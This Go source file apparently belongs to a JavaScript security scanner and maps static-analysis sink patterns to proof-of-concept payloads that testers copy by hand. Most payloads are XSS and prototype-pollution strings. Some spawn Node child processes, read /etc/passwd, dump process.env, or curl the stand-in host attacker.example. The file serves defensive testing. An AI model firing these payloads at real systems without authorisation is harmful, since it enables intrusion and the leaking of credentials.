// PoC payload generation. Each static-analysis pattern carries a small set of
// copy-pasteable payloads for manual verification (e.g. pasted into a browser
// console or an intercepted request via the scan proxy). Payloads are
// deliberately benign: they prove reachability of the sink without causing
// damage — alert-based DOM payloads and read-only Node probes.

package jssecrets

import (
	"os"
	"path/filepath"
	"strings"
)

// payloadLibrary maps analysis pattern names to the payloads a tester can use
// to confirm the sink is reachable and exploitable.
var payloadLibrary = map[string][]string{
	"eval": {
		`alert(document.domain)`,
		`eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))`,
		`javascript:alert(document.domain)`,
	},
	"function": {
		`alert(document.domain)`,
		`");alert(document.domain);//`,
	},
	"document-write": {
		`<script>alert(document.domain)</script>`,
		`</script><script>alert(document.domain)</script>`,
		`<img src=x onerror=alert(document.domain)>`,
	},
	"html": {
		`"><img src=x onerror=alert(document.domain)>`,
		`'><svg onload=alert(document.domain)>`,
		`<img src=x onerror=alert(1)>`,
		`<iframe srcdoc="<script>alert(document.domain)</script>">`,
	},
	"timer": {
		`alert(document.domain)`,
		`1);alert(document.domain);//`,
	},
	"location": {
		`javascript:alert(document.domain)`,
		`data:text/html,<script>alert(document.domain)</script>`,
		`https://attacker.example/`,
	},
	"postmessage": {
		`<iframe src="https://TARGET" onload="this.contentWindow.postMessage('hello','*')">`,
		`parent.postMessage({data:'{"__proto__":{"isAdmin":true}}'}, "*")`,
		`window.postMessage(JSON.stringify({"__proto__":{"isAdmin":true}}), "*")`,
	},
	"proto-pollution": {
		`{"__proto__": {"isAdmin": true}}`,
		`{"__proto__": {"polluted": "yes"}}`,
		`{"constructor": {"prototype": {"isAdmin": true}}}`,
		`__proto__[isAdmin]=true`,
		`constructor[prototype][isAdmin]=true`,
	},
	"child-process": {
		`require('child_process').execSync('id')`,
		`process.mainModule.require('child_process').execSync('id')`,
		`require('child_process').exec('curl http://attacker.example/')`,
	},
	"fs": {
		`require('fs').readFileSync('/etc/passwd', 'utf8')`,
		`require('fs').readdirSync('/etc')`,
	},
	"env": {
		`JSON.stringify(process.env)`,
	},
}

// collectPayloads returns the deduplicated payloads referenced by findings.
func collectPayloads(findings []finding) []string {
	var payloads []string
	seen := make(map[string]struct{})
	for _, f := range findings {
		for _, payload := range f.Payloads {
			if _, ok := seen[payload]; ok {
				continue
			}
			seen[payload] = struct{}{}
			payloads = append(payloads, payload)
		}
	}
	return payloads
}

// writePayloadsFile writes the flat, deduplicated payload list so testers can
// copy payloads into their browser console or an intercepted request without
// digging through the JSONL findings.
func writePayloadsFile(path string, payloads []string) error {
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		return err
	}
	return os.WriteFile(path, []byte(strings.Join(payloads, "\n")+"\n"), 0644)
}
